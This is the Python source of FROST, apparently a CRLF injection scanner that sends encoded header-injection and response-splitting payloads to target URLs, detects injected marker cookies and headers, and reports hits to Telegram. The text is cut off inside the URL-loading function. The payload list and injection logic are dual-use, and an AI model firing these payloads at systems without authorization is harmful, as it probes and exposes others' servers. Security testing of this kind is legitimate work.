#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  ███████╗██████╗  ██████╗ ███████╗████████╗                                ║
║  ██╔════╝██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝                                ║
║  █████╗  ██████╔╝██║   ██║███████╗   ██║                                   ║
║  ██╔══╝  ██╔══██╗██║   ██║╚════██║   ██║                                   ║
║  ██║     ██║  ██║╚██████╔╝███████║   ██║                                   ║
║  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝                                   ║
╚══════════════════════════════════════════════════════════════════════════════╝

FROST — CRLF Injection Scanner
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Probe. Inject. Expose.

A high-accuracy, high-performance CRLF injection vulnerability detector
for bug bounty hunters and penetration testers.

Author  : 0xgh0stri13y
GitHub  : https://github.com/0xgh0stri13y/FROST
Version : 1.2.0

⚠️  DISCLAIMER: For authorized security testing and education only.
    Unauthorized scanning is illegal. Always obtain proper authorization.
"""

import argparse
import asyncio
import json
import os
import random
import re
import socket
import ssl
import sys

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

import time
from dataclasses import dataclass, asdict
from enum import Enum
from typing import Optional
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

try:
    import aiohttp
    from aiohttp import ClientTimeout, TCPConnector
except ImportError:
    print("[!] aiohttp is required. Install with: pip install aiohttp")
    sys.exit(1)

try:
    from colorama import init as colorama_init, Fore, Style
    colorama_init(autoreset=True)
except ImportError:
    class Fore:
        RED = YELLOW = GREEN = CYAN = MAGENTA = BLUE = WHITE = RESET = ""
        LIGHTRED_EX = LIGHTYELLOW_EX = LIGHTGREEN_EX = LIGHTCYAN_EX = ""
        LIGHTMAGENTA_EX = LIGHTBLUE_EX = LIGHTWHITE_EX = ""
    class Style:
        BRIGHT = DIM = RESET_ALL = ""

try:
    from aiohttp_socks import ProxyConnector
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False


VERSION = "1.2.0"
MARKER = "0xgh0stri13y"
MARKER_COOKIE_NAME = "gh0stri13y"
MARKER_COOKIE_VALUE = "0xgh0stri13y"
MARKER_HEADER_NAME = "X-gh0stri13y"
MARKER_HEADER_VALUE = "0xgh0stri13y"

MARKER_COOKIE_PAIR_RE = re.compile(
    rf"(?:^|[;,\s]){re.escape(MARKER_COOKIE_NAME)}\s*=\s*"
    rf"{re.escape(MARKER_COOKIE_VALUE)}(?:$|[;,\s])",
    re.IGNORECASE,
)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
]


class PayloadCategory(Enum):
    STANDARD = "standard"
    DOUBLE_ENCODED = "double_encoded"
    UNICODE = "unicode"
    NULL_BYTE = "null_byte"
    MIXED = "mixed"
    RESPONSE_SPLIT = "response_split"


@dataclass
class Payload:
    raw: str
    category: PayloadCategory
    description: str
    injection_type: str

    def inject_into_path(self, base_url: str) -> str:
        parsed = urlparse(base_url)
        clean_path = parsed.path.rstrip("/")
        injected_path = f"{clean_path}/{self.raw}"
        return urlunparse((
            parsed.scheme, parsed.netloc, injected_path,
            parsed.params, parsed.query, parsed.fragment
        ))

    def inject_into_query(self, base_url: str) -> str:
        parsed = urlparse(base_url)
        existing_params = parse_qs(parsed.query, keep_blank_values=True)
        if existing_params:
            key = list(existing_params.keys())[0]
            original_val = existing_params[key][0] if existing_params[key] else ""
            existing_params[key] = [original_val + self.raw]
            new_query = urlencode(existing_params, doseq=True)
        else:
            new_query = f"q={self.raw}"
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))


def generate_payloads() -> list[Payload]:
    payloads = []

    standard_crlf_sequences = [
        "%0d%0a",
        "%0D%0A",
        "%0a",
        "%0d",
        "%0A",
        "%0D",
        "%0d%0a%0d%0a",
        "%0a%0a",
    ]

    for seq in standard_crlf_sequences:
        payloads.append(Payload(
            raw=f"{seq}Set-Cookie:{MARKER_COOKIE_NAME}={MARKER_COOKIE_VALUE}",
            category=PayloadCategory.STANDARD,
            description=f"Set-Cookie injection via {seq}",
            injection_type="path"
        ))
        payloads.append(Payload(
            raw=f"{seq}{MARKER_HEADER_NAME}:{MARKER_HEADER_VALUE}",
            category=PayloadCategory.STANDARD,
            description=f"Custom header injection via {seq}",
            injection_type="path"
        ))

    double_encoded_sequences = [
        "%250d%250a",
        "%250D%250A",
        "%250a",
        "%25250d%25250a",
    ]

    for seq in double_encoded_sequences:
        payloads.append(Payload(
            raw=f"{seq}Set-Cookie:{MARKER_COOKIE_NAME}={MARKER_COOKIE_VALUE}",
            category=PayloadCategory.DOUBLE_ENCODED,
            description=f"Double-encoded Set-Cookie via {seq}",
            injection_type="path"
        ))
        payloads.append(Payload(
            raw=f"{seq}{MARKER_HEADER_NAME}:{MARKER_HEADER_VALUE}",
            category=PayloadCategory.DOUBLE_ENCODED,
            description=f"Double-encoded header via {seq}",
            injection_type="path"
        ))

    unicode_sequences = [
        "%e5%98%8a%e5%98%8d",
        "%E5%98%8A%E5%98%8D",
        "%e5%98%8d%e5%98%8a",
        "%c4%8d%c4%8a",
    ]

    for seq in unicode_sequences:
        payloads.append(Payload(
            raw=f"{seq}Set-Cookie:{MARKER_COOKIE_NAME}={MARKER_COOKIE_VALUE}",
            category=PayloadCategory.UNICODE,
            description=f"Unicode CRLF Set-Cookie via {seq[:10]}...",
            injection_type="path"
        ))

    null_prefixed = [
        "%00%0d%0a",
        "%00%0a",
        "%20%0d%0a",
        "%09%0d%0a",
    ]

    for seq in null_prefixed:
        payloads.append(Payload(
            raw=f"{seq}Set-Cookie:{MARKER_COOKIE_NAME}={MARKER_COOKIE_VALUE}",
            category=PayloadCategory.NULL_BYTE,
            description=f"Null-prefixed CRLF via {seq}",
            injection_type="path"
        ))

    mixed_sequences = [
        "%0d%0A",
        "%0D%0a",
        "%%0d0a",
        "%0%0d%0a",
    ]

    for seq in mixed_sequences:
        payloads.append(Payload(
            raw=f"{seq}Set-Cookie:{MARKER_COOKIE_NAME}={MARKER_COOKIE_VALUE}",
            category=PayloadCategory.MIXED,
            description=f"Mixed encoding via {seq}",
            injection_type="path"
        ))

    payloads.append(Payload(
        raw=f"%0d%0a%0d%0a<html>{MARKER}</html>",
        category=PayloadCategory.RESPONSE_SPLIT,
        description="Response splitting with HTML body injection",
        injection_type="path"
    ))
    payloads.append(Payload(
        raw=f"%0d%0a%0d%0a{MARKER}",
        category=PayloadCategory.RESPONSE_SPLIT,
        description="Response splitting with text body injection",
        injection_type="path"
    ))

    for seq in ["%0d%0a", "%0D%0A", "%250d%250a", "%e5%98%8a%e5%98%8d"]:
        payloads.append(Payload(
            raw=f"{seq}Set-Cookie:{MARKER_COOKIE_NAME}={MARKER_COOKIE_VALUE}",
            category=PayloadCategory.STANDARD,
            description=f"Query param injection via {seq}",
            injection_type="query"
        ))
        payloads.append(Payload(
            raw=f"{seq}{MARKER_HEADER_NAME}:{MARKER_HEADER_VALUE}",
            category=PayloadCategory.STANDARD,
            description=f"Query param header injection via {seq}",
            injection_type="query"
        ))

    return payloads


def build_control_url(base_url: str) -> str:
    parsed = urlparse(base_url)
    clean_path = parsed.path.rstrip("/")
    control_path = f"{clean_path}/{MARKER}"
    return urlunparse((
        parsed.scheme, parsed.netloc, control_path,
        parsed.params, parsed.query, parsed.fragment
    ))


class Confidence(Enum):
    LOW = "LOW"
    MEDIUM = "MEDIUM"
    HIGH = "HIGH"
    CONFIRMED = "CONFIRMED"


@dataclass
class DetectionSignal:
    signal_type: str
    description: str
    weight: float


@dataclass
class ScanResult:
    target_url: str
    payload_url: str
    payload: str
    payload_description: str
    vulnerable: bool
    confidence: Confidence
    confidence_score: float
    signals: list[DetectionSignal]
    evidence: dict
    timestamp: str
    injection_type: str = ""


@dataclass
class BaselineResponse:
    status_code: int
    headers: dict
    header_count: int
    body_snippet: str
    content_length: int


class DetectionEngine:

    @staticmethod
    def confidence_from_score(score: float) -> Confidence:
        if score >= 0.8:
            return Confidence.CONFIRMED
        elif score >= 0.5:
            return Confidence.HIGH
        elif score >= 0.25:
            return Confidence.MEDIUM
        return Confidence.LOW

    @staticmethod
    def analyze(
        response_status: int,
        response_headers: dict,
        response_body: str,
        baseline: Optional[BaselineResponse],
        payload: Payload,
        control_body_reflects: bool = False,
    ) -> tuple[bool, Confidence, float, list[DetectionSignal], dict]:
        signals: list[DetectionSignal] = []
        evidence: dict = {}
        normalized_headers = {k.lower(): v for k, v in response_headers.items()}

        set_cookies = []
        for key, val in response_headers.items():
            if key.lower() == "set-cookie":
                if isinstance(val, str):
                    set_cookies.append(val)
                elif isinstance(val, (list, tuple)):
                    set_cookies.extend(val)

        for cookie_val in set_cookies:
            if MARKER_COOKIE_PAIR_RE.search(cookie_val):
                signals.append(DetectionSignal(
                    signal_type="injected_cookie",
                    description=f"Injected Set-Cookie header found: {cookie_val}",
                    weight=0.5
                ))
                evidence["injected_cookie"] = cookie_val
                break

        if MARKER_HEADER_NAME.lower() in normalized_headers:
            header_val = normalized_headers[MARKER_HEADER_NAME.lower()]
            if MARKER_HEADER_VALUE in str(header_val):
                signals.append(DetectionSignal(
                    signal_type="injected_header",
                    description=f"Injected header {MARKER_HEADER_NAME} found with value: {header_val}",
                    weight=0.5
                ))
                evidence["injected_header"] = f"{MARKER_HEADER_NAME}: {header_val}"

        if baseline:
            current_header_count = len(response_headers)
            if current_header_count > baseline.header_count:
                diff = current_header_count - baseline.header_count
                signals.append(DetectionSignal(
                    signal_type="header_count_anomaly",
                    description=f"Response has {diff} more headers than baseline ({current_header_count} vs {baseline.header_count})",
                    weight=0.15
                ))
                evidence["header_count_diff"] = diff

        if response_body and MARKER in response_body:
            if control_body_reflects:
                evidence["body_reflection_ruled_out_by_control"] = True
            elif not baseline or MARKER not in baseline.body_snippet:
                signals.append(DetectionSignal(
                    signal_type="body_reflection",
                    description=f"Marker '{MARKER}' found reflected in response body (response splitting)",
                    weight=0.4
                ))
                evidence["body_reflection"] = True

        if baseline:
            baseline_keys = set(k.lower() for k in baseline.headers.keys())
            current_keys = set(k.lower() for k in response_headers.keys())
            new_headers = current_keys - baseline_keys
            ignore_headers = {"date", "age", "x-request-id", "x-trace-id",
                              "cf-ray", "x-served-by", "x-cache", "x-timer",
                              "x-amz-request-id", "x-amz-id-2"}
            new_headers -= ignore_headers
            if new_headers:
                signals.append(DetectionSignal(
                    signal_type="new_headers_detected",
                    description=f"New headers in response: {', '.join(new_headers)}",
                    weight=0.2
                ))
                evidence["new_headers"] = list(new_headers)

        if not signals:
            return False, Confidence.LOW, 0.0, signals, evidence

        total_score = min(1.0, sum(s.weight for s in signals))
        confidence = DetectionEngine.confidence_from_score(total_score)

        has_injection_signal = any(
            s.signal_type in ("injected_cookie", "injected_header")
            for s in signals
        )
        vulnerable = has_injection_signal and total_score >= 0.25

        return vulnerable, confidence, total_score, signals, evidence


class RawSocketVerifier:

    @staticmethod
    def verify(url: str, timeout: float = 10.0) -> tuple[bool, dict]:
        try:
            parsed = urlparse(url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == "https" else 80)
            path = parsed.path or "/"
            if parsed.query:
                path += f"?{parsed.query}"

            request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: FROST/{VERSION}\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            )

            raw_sock = socket.create_connection((host, port), timeout=timeout)
            raw_sock.settimeout(timeout)

            if parsed.scheme == "https":
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(raw_sock, server_hostname=host)
            else:
                sock = raw_sock

            sock.sendall(request.encode("utf-8", errors="replace"))

            response_data = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response_data += chunk
                    if len(response_data) > 65536:
                        break
                except socket.timeout:
                    break
            sock.close()

            raw_text = response_data.decode("utf-8", errors="replace")
            header_section = raw_text.split("\r\n\r\n")[0] if "\r\n\r\n" in raw_text else raw_text

            evidence = {}

            cookie_pattern = re.compile(
                rf"(?:^|\r\n)Set-Cookie:\s*{re.escape(MARKER_COOKIE_NAME)}\s*=\s*"
                rf"{re.escape(MARKER_COOKIE_VALUE)}(?:\s*;|\s*\r\n|\s*$)",
                re.IGNORECASE
            )
            if cookie_pattern.search(header_section):
                evidence["raw_injected_cookie"] = True

            header_pattern = re.compile(
                rf"(?:^|\r\n){re.escape(MARKER_HEADER_NAME)}:\s*"
                rf"{re.escape(MARKER_HEADER_VALUE)}(?:\s*\r\n|\s*$)",
                re.IGNORECASE
            )
            if header_pattern.search(header_section):
                evidence["raw_injected_header"] = True

            body = raw_text.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in raw_text else ""
            if MARKER in body:
                evidence["raw_body_reflection"] = True

            verified = bool(evidence)
            return verified, evidence

        except Exception as e:
            return False, {"error": str(e)}


@dataclass
class ScanStats:
    total_urls: int = 0
    total_requests: int = 0
    total_payloads_tested: int = 0
    vulnerabilities_found: int = 0
    confirmed_count: int = 0
    high_count: int = 0
    medium_count: int = 0
    errors: int = 0
    start_time: float = 0.0
    end_time: float = 0.0


class CRLFScanner:

    def __init__(
        self,
        concurrency: int = 10,
        timeout: float = 10.0,
        proxy: Optional[str] = None,
        follow_redirects: bool = False,
        custom_headers: Optional[dict] = None,
        verbose: bool = False,
        verify_with_raw_socket: bool = True,
        telegram_token: Optional[str] = None,
        telegram_chatid: Optional[str] = None,
        delay: float = 0.0,
    ):
        self.concurrency = concurrency
        self.timeout = timeout
        self.proxy = proxy
        self.follow_redirects = follow_redirects
        self.custom_headers = custom_headers or {}
        self.verbose = verbose
        self.delay = max(0.0, delay)
        self.verify_with_raw_socket = verify_with_raw_socket
        self.telegram_token = telegram_token
        self.telegram_chatid = telegram_chatid
        self.telegram_notifier: Optional[TelegramNotifier] = None
        if telegram_token and telegram_chatid:
            self.telegram_notifier = TelegramNotifier(telegram_token, telegram_chatid)
        self.payloads = generate_payloads()
        self.stats = ScanStats()
        self.results: list[ScanResult] = []
        self._semaphore: Optional[asyncio.Semaphore] = None

    def _get_connector(self):
        if self.proxy:
            if self.proxy.startswith("socks"):
                if not HAS_SOCKS:
                    print(f"{Fore.RED}[!] SOCKS proxy requires aiohttp-socks: pip install aiohttp-socks{Style.RESET_ALL}")
                    sys.exit(1)
                return ProxyConnector.from_url(self.proxy)
        return TCPConnector(ssl=False, limit=self.concurrency)

    def _get_headers(self) -> dict:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
        }
        headers.update(self.custom_headers)
        return headers

    async def _fetch_baseline(
        self, session: aiohttp.ClientSession, url: str
    ) -> Optional[BaselineResponse]:
        try:
            proxy = self.proxy if self.proxy and not self.proxy.startswith("socks") else None
            async with session.get(
                url,
                headers=self._get_headers(),
                allow_redirects=self.follow_redirects,
                timeout=ClientTimeout(total=self.timeout),
                proxy=proxy,
            ) as resp:
                body = await resp.text(errors="replace")
                return BaselineResponse(
                    status_code=resp.status,
                    headers=dict(resp.headers),
                    header_count=len(resp.headers),
                    body_snippet=body[:2048],
                    content_length=len(body),
                )
        except Exception as e:
            if self.verbose:
                print(f"  {Fore.YELLOW}[WARN] Baseline fetch failed for {url}: {e}{Style.RESET_ALL}")
            return None

    async def _fetch_control(self, session: aiohttp.ClientSession, url: str) -> bool:
        control_url = build_control_url(url)
        try:
            proxy = self.proxy if self.proxy and not self.proxy.startswith("socks") else None
            async with session.get(
                control_url,
                headers=self._get_headers(),
                allow_redirects=self.follow_redirects,
                timeout=ClientTimeout(total=self.timeout),
                proxy=proxy,
            ) as resp:
                body = await resp.text(errors="replace")
                return MARKER in body
        except Exception as e:
            if self.verbose:
                print(f"  {Fore.YELLOW}[WARN] Control fetch failed for {url}: {e}{Style.RESET_ALL}")
            return True

    async def _test_payload(
        self,
        session: aiohttp.ClientSession,
        target_url: str,
        payload: Payload,
        baseline: Optional[BaselineResponse],
        control_reflects: bool,
    ) -> Optional[ScanResult]:
        async with self._semaphore:
            if self.delay:
                await asyncio.sleep(self.delay + random.uniform(0, self.delay))

            if payload.injection_type == "query":
                injected_url = payload.inject_into_query(target_url)
            else:
                injected_url = payload.inject_into_path(target_url)

            if self.verbose:
                print(f"  {Fore.CYAN}[→] Testing: {injected_url[:120]}...{Style.RESET_ALL}")

            try:
                proxy = self.proxy if self.proxy and not self.proxy.startswith("socks") else None
                async with session.get(
                    injected_url,
                    headers=self._get_headers(),
                    allow_redirects=self.follow_redirects,
                    timeout=ClientTimeout(total=self.timeout),
                    proxy=proxy,
                ) as resp:
                    self.stats.total_requests += 1
                    self.stats.total_payloads_tested += 1

                    body = await resp.text(errors="replace")
                    response_headers = dict(resp.headers)

                    vulnerable, confidence, score, signals, evidence = DetectionEngine.analyze(
                        response_status=resp.status,
                        response_headers=response_headers,
                        response_body=body,
                        baseline=baseline,
                        payload=payload,
                        control_body_reflects=control_reflects,
                    )

                    if vulnerable:
                        if self.verify_with_raw_socket and confidence in (Confidence.HIGH, Confidence.CONFIRMED):
                            verified, raw_evidence = RawSocketVerifier.verify(injected_url, self.timeout)
                            if verified:
                                signals.append(DetectionSignal(
                                    signal_type="raw_socket_verified",
                                    description="Injection confirmed via raw TCP socket",
                                    weight=0.3
                                ))
                                evidence.update(raw_evidence)
                                score = min(1.0, score + 0.3)
                                confidence = DetectionEngine.confidence_from_score(score)

                        result = ScanResult(
                            target_url=target_url,
                            payload_url=injected_url,
                            payload=payload.raw,
                            payload_description=payload.description,
                            vulnerable=True,
                            confidence=confidence,
                            confidence_score=round(score, 2),
                            signals=[asdict(s) for s in signals],
                            evidence=evidence,
                            timestamp=time.strftime("%Y-%m-%dT%H:%M:%S%z"),
                            injection_type=payload.injection_type,
                        )
                        return result

            except asyncio.TimeoutError:
                self.stats.errors += 1
                if self.verbose:
                    print(f"  {Fore.YELLOW}[TIMEOUT] {injected_url[:80]}...{Style.RESET_ALL}")
            except aiohttp.ClientError as e:
                self.stats.errors += 1
                if self.verbose:
                    print(f"  {Fore.YELLOW}[ERROR] {injected_url[:60]}... → {e}{Style.RESET_ALL}")
            except Exception as e:
                self.stats.errors += 1
                if self.verbose:
                    print(f"  {Fore.RED}[ERROR] Unexpected: {e}{Style.RESET_ALL}")

            return None

    async def scan_url(self, session: aiohttp.ClientSession, url: str) -> list[ScanResult]:
        self.stats.total_urls += 1
        print(f"\n{Fore.LIGHTCYAN_EX}{'━' * 70}{Style.RESET_ALL}")
        print(f"  {Fore.LIGHTWHITE_EX}🎯 Target: {Fore.CYAN}{url}{Style.RESET_ALL}")
        print(f"  {Fore.LIGHTWHITE_EX}📦 Payloads: {Fore.YELLOW}{len(self.payloads)}{Style.RESET_ALL}")
        print(f"{Fore.LIGHTCYAN_EX}{'━' * 70}{Style.RESET_ALL}")

        print(f"  {Fore.WHITE}[⏳] Fetching baseline response...{Style.RESET_ALL}", end="", flush=True)
        baseline = await self._fetch_baseline(session, url)
        if baseline:
            print(f"\r  {Fore.GREEN}[✓] Baseline: HTTP {baseline.status_code} | {baseline.header_count} headers | {baseline.content_length} bytes{Style.RESET_ALL}")
        else:
            print(f"\r  {Fore.YELLOW}[⚠] Could not fetch baseline (will scan without comparison){Style.RESET_ALL}")

        print(f"  {Fore.WHITE}[⏳] Fetching control response (marker, no CRLF)...{Style.RESET_ALL}", end="", flush=True)
        control_reflects = await self._fetch_control(session, url)
        if control_reflects:
            print(f"\r  {Fore.YELLOW}[i] Control: marker reflects in body even without CRLF — body_reflection will be ignored as evidence{Style.RESET_ALL}")
        else:
            print(f"\r  {Fore.GREEN}[✓] Control: clean (no generic echo of the marker){Style.RESET_ALL}")

        print(f"  {Fore.WHITE}[⏳] Testing {len(self.payloads)} payloads...{Style.RESET_ALL}")

        tasks = [
            self._test_payload(session, url, payload, baseline, control_reflects)
            for payload in self.payloads
        ]
        results_raw = await asyncio.gather(*tasks, return_exceptions=True)

        url_results: list[ScanResult] = []
        seen_types = set()

        for r in results_raw:
            if isinstance(r, ScanResult) and r.vulnerable:
                sig_key = (r.injection_type, frozenset(r.evidence.keys()))
                if sig_key not in seen_types:
                    seen_types.add(sig_key)
                    url_results.append(r)
                    self.stats.vulnerabilities_found += 1

                    if r.confidence == Confidence.CONFIRMED:
                        self.stats.confirmed_count += 1
                    elif r.confidence == Confidence.HIGH:
                        self.stats.high_count += 1
                    elif r.confidence == Confidence.MEDIUM:
                        self.stats.medium_count += 1

        if url_results:
            for r in url_results:
                conf_color = {
                    Confidence.CONFIRMED: Fore.LIGHTGREEN_EX,
                    Confidence.HIGH: Fore.GREEN,
                    Confidence.MEDIUM: Fore.YELLOW,
                    Confidence.LOW: Fore.LIGHTWHITE_EX,
                }[r.confidence]
                print()
                print(f"  {Fore.LIGHTRED_EX}💥 VULNERABLE!{Style.RESET_ALL}")
                print(f"  {Fore.WHITE}├─ Confidence : {conf_color}{r.confidence.value} ({r.confidence_score:.0%}){Style.RESET_ALL}")
                print(f"  {Fore.WHITE}├─ Payload    : {Fore.MAGENTA}{r.payload_description}{Style.RESET_ALL}")
                print(f"  {Fore.WHITE}├─ PoC URL    : {Fore.CYAN}{r.payload_url}{Style.RESET_ALL}")
                if r.evidence:
                    print(f"  {Fore.WHITE}└─ Evidence   : {Fore.YELLOW}{json.dumps(r.evidence, indent=None)}{Style.RESET_ALL}")
        else:
            print(f"  {Fore.GREEN}[✓] No CRLF injection vulnerabilities detected.{Style.RESET_ALL}")

        self.results.extend(url_results)

        if self.telegram_notifier and url_results:
            for r in url_results:
                await self.telegram_notifier.send_vulnerability(session, r)

        return url_results

    async def scan(self, urls: list[str]) -> list[ScanResult]:
        self._semaphore = asyncio.Semaphore(self.concurrency)
        self.stats.start_time = time.time()

        connector = self._get_connector()
        async with aiohttp.ClientSession(connector=connector) as session:
            for url in urls:
                await self.scan_url(session, url)

            self.stats.end_time = time.time()

            if self.telegram_notifier:
                await self.telegram_notifier.send_summary(session, self.stats)

        return self.results


class TelegramNotifier:

    def __init__(self, token: str, chat_id: str):
        self.token = token.strip()
        self.chat_id = chat_id.strip()
        self.api_url = f"https://api.telegram.org/bot{self.token}/sendMessage"

    async def send_message(self, session: aiohttp.ClientSession, text: str) -> bool:
        payload = {
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": True,
        }
        try:
            async with session.post(self.api_url, json=payload, timeout=ClientTimeout(total=10)) as resp:
                if resp.status == 200:
                    return True
                else:
                    body = await resp.text()
                    print(f"  {Fore.YELLOW}[!] Telegram API error (HTTP {resp.status}): {body}{Style.RESET_ALL}")
                    return False
        except Exception as e:
            print(f"  {Fore.YELLOW}[!] Failed to send Telegram alert: {e}{Style.RESET_ALL}")
            return False

    async def send_vulnerability(self, session: aiohttp.ClientSession, result: ScanResult):
        emoji = "💥" if result.confidence in (Confidence.CONFIRMED, Confidence.HIGH) else "⚠️"
        msg = (
            f"{emoji} <b>CRLF Injection Vulnerability Detected!</b>\n\n"
            f"🎯 <b>Target:</b> <code>{result.target_url}</code>\n"
            f"📊 <b>Confidence:</b> <b>{result.confidence.value}</b> ({result.confidence_score:.0%})\n"
            f"📝 <b>Payload:</b> {result.payload_description}\n"
            f"🔗 <b>PoC URL:</b> <code>{result.payload_url}</code>\n"
        )
        if result.evidence:
            evidence_str = json.dumps(result.evidence)
            msg += f"🔍 <b>Evidence:</b> <code>{evidence_str}</code>\n"
        msg += f"\n⚡ <i>Reported by FROST v{VERSION}</i>"

        sent = await self.send_message(session, msg)
        if sent:
            print(f"  {Fore.GREEN}[✓] Vulnerability alert sent to Telegram chat!{Style.RESET_ALL}")

    async def send_summary(self, session: aiohttp.ClientSession, stats: ScanStats):
        elapsed = stats.end_time - stats.start_time
        rps = stats.total_requests / elapsed if elapsed > 0 else 0
        vuln_status = f"💥 {stats.vulnerabilities_found} Vulnerable" if stats.vulnerabilities_found > 0 else "✅ Clean (0 Vulnerabilities)"

        msg = (
            f"📊 <b>FROST Scan Completed</b>\n\n"
            f"🌐 <b>URLs Scanned:</b> {stats.total_urls}\n"
            f"🔢 <b>Total Requests:</b> {stats.total_requests}\n"
            f"⏱️ <b>Elapsed Time:</b> {elapsed:.1f}s ({rps:.1f} req/s)\n"
            f"🚨 <b>Result Status:</b> <b>{vuln_status}</b>\n"
        )
        if stats.vulnerabilities_found > 0:
            msg += (
                f"  ├─ Confirmed: {stats.confirmed_count}\n"
                f"  ├─ High: {stats.high_count}\n"
                f"  └─ Medium: {stats.medium_count}\n"
            )
        msg += f"\n⚡ <i>FROST v{VERSION}</i>"

        await self.send_message(session, msg)


class Reporter:

    @staticmethod
    def print_summary(stats: ScanStats):
        elapsed = stats.end_time - stats.start_time
        rps = stats.total_requests / elapsed if elapsed > 0 else 0

        print(f"\n{Fore.LIGHTCYAN_EX}{'═' * 70}{Style.RESET_ALL}")
        print(f"  {Fore.LIGHTWHITE_EX}{Style.BRIGHT}📊 SCAN SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.LIGHTCYAN_EX}{'═' * 70}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}URLs scanned       : {Fore.CYAN}{stats.total_urls}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Total requests     : {Fore.CYAN}{stats.total_requests}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Payloads tested    : {Fore.CYAN}{stats.total_payloads_tested}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Elapsed time       : {Fore.CYAN}{elapsed:.1f}s{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Requests/second    : {Fore.CYAN}{rps:.1f}{Style.RESET_ALL}")
        print(f"  {Fore.WHITE}Errors             : {Fore.YELLOW}{stats.errors}{Style.RESET_ALL}")
        print()

        vuln_color = Fore.LIGHTRED_EX if stats.vulnerabilities_found > 0 else Fore.GREEN
        print(f"  {Fore.WHITE}Vulnerabilities    : {vuln_color}{stats.vulnerabilities_found}{Style.RESET_ALL}")
        if stats.vulnerabilities_found > 0:
            print(f"  {Fore.WHITE}  ├─ Confirmed     : {Fore.LIGHTGREEN_EX}{stats.confirmed_count}{Style.RESET_ALL}")
            print(f"  {Fore.WHITE}  ├─ High          : {Fore.GREEN}{stats.high_count}{Style.RESET_ALL}")
            print(f"  {Fore.WHITE}  └─ Medium        : {Fore.YELLOW}{stats.medium_count}{Style.RESET_ALL}")
        print(f"{Fore.LIGHTCYAN_EX}{'═' * 70}{Style.RESET_ALL}")

    @staticmethod
    def save_json(results: list[ScanResult], filepath: str):
        output = []
        for r in results:
            entry = {
                "target_url": r.target_url,
                "payload_url": r.payload_url,
                "payload": r.payload,
                "payload_description": r.payload_description,
                "injection_type": r.injection_type,
                "vulnerable": r.vulnerable,
                "confidence": r.confidence.value,
                "confidence_score": r.confidence_score,
                "signals": r.signals,
                "evidence": r.evidence,
                "timestamp": r.timestamp,
            }
            output.append(entry)

        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(output, f, indent=2, ensure_ascii=False)
        print(f"\n  {Fore.GREEN}[✓] Results saved to {Fore.CYAN}{filepath}{Style.RESET_ALL}")

    @staticmethod
    def save_text(results: list[ScanResult], filepath: str):
        with open(filepath, "w", encoding="utf-8") as f:
            for r in results:
                f.write(f"[{r.confidence.value}] {r.target_url}\n")
                f.write(f"  PoC: {r.payload_url}\n")
                f.write(f"  Payload: {r.payload_description}\n")
                f.write(f"  Score: {r.confidence_score:.0%}\n")
                if r.evidence:
                    f.write(f"  Evidence: {json.dumps(r.evidence)}\n")
                f.write("\n")
        print(f"\n  {Fore.GREEN}[✓] Results saved to {Fore.CYAN}{filepath}{Style.RESET_ALL}")


BANNER = rf"""{Fore.LIGHTCYAN_EX}
   ____ ____  _     _____ ____   ____    _    _   _
  / ___|  _ \| |   |  ___/ ___| / ___|  / \  | \ | |
 | |   | |_) | |   | |_  \___ \| |     / _ \ |  \| |
 | |___|  _ <| |___|  _|  ___) | |___ / ___ \| |\  |
  \____|_| \_|_____|_|   |____/ \____/_/   \_|_| \_|
{Style.RESET_ALL}
  {Fore.WHITE}{Style.BRIGHT}FROST — CRLF Injection Scanner v{VERSION}{Style.RESET_ALL}
  {Fore.LIGHTWHITE_EX}---------------------------------------------------{Style.RESET_ALL}
  {Fore.YELLOW}[!] For authorized security testing only{Style.RESET_ALL}
"""


def validate_url(url: str) -> str:
    url = url.strip()
    if not url:
        return ""
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    parsed = urlparse(url)
    if not parsed.hostname:
        return ""
    return url


def load_urls_from_file(filepath: str) -> list[str]:
    if not os.path.isfile(filepath):
        print(f"{Fore.RED}[!] File not found: {filepath}{Style.RESET_ALL}")
        sys.exit(1)

    urls = []
    with open(filepath, "r", encoding="utf-8") as f:
        for line_num, line in enumerate(f, 1):
            url = validate_url(line)
            if url:
                urls.append(url)
